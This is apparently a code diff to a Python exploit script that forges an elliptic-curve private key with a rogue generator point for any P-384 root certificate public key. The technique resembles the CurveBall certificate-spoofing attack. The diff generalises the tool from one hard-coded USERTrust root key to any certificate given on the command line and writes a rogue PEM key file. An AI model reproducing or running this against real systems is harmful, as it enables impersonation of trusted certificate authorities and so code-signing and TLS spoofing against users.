@@ -1,8 +1,12 @@
+import gmpy2
+import sys
+
 from fastecdsa.curve import P384
 from fastecdsa.point import Point
 from Crypto.Util.asn1 import DerSequence, DerOctetString, DerBitString, DerObjectId
-import gmpy2
 from Crypto.IO import PEM
+from Crypto.PublicKey import ECC
+from binascii import hexlify
 
 def generate_privkey(d, generator):
     """
@@ -35,15 +39,28 @@ def generate_privkey(d, generator):
     return seq
 
 if __name__ == "__main__":
-    # USERTrust ECC Certification Authority public key
-    pubkey = b"1aac545aa9f96823e77ad5246f53c65ad84babc6d5b6d1e67371aedd9cd60c61fddba08903b80514ec57ceee5d3fe221b3cef7d48a79e0a3837e2d97d061c4f199dc259163ab7f30a3b470e2c7a1339cf3bf2e5c53b15fb37d327f8a34e37979"
-    Q = Point(int(pubkey[0:96],16), int(pubkey[96:],16), curve=P384)
+
+    if len(sys.argv) != 2:
+        print("Usage " + sys.argv[0] + " root-certificate.pem")
+        sys.exit()
+
+    # Public key extraction
+    cert = open(sys.argv[1], "r")
+    pubkey = ECC.import_key(cert.read())
+    cert.close()
+    nb_bytes = pubkey.pointQ.size_in_bytes()
+
+    if pubkey.curve != "NIST P-384":
+        print("Public key must be on P-384 curve")
+        sys.exit()
+
+    Q = Point(int(pubkey.pointQ.x), int(pubkey.pointQ.y), curve=P384)
+
     # Generate rogue generator
-    privkey_inv = 2
-    # we take the private key as being the inverse of 2 modulo the curve order
-    privkey = int(gmpy2.invert(privkey_inv,P384.q))
-    # we multply our public key Q with the inverse of our chosen private key value
-    rogueG = privkey_inv * Q
+    # we take the private key as being 2
+    privkey = 2
+    # we multiply our public key Q with the inverse of our chosen private key value
+    rogueG = gmpy2.invert(privkey,P384.q) * Q
     der = DerSequence(generate_privkey(privkey, rogueG))
     # Generate new file
     f = open('p384-key-rogue.pem','w')
